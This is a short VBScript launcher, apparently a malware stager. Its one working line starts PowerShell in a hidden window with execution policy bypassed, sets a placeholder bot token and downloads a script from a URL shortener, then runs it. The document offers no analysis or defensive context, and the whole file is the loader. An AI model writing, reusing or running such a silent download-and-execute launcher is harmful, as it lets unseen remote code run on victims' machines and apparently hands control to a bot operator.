Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex", 0, True

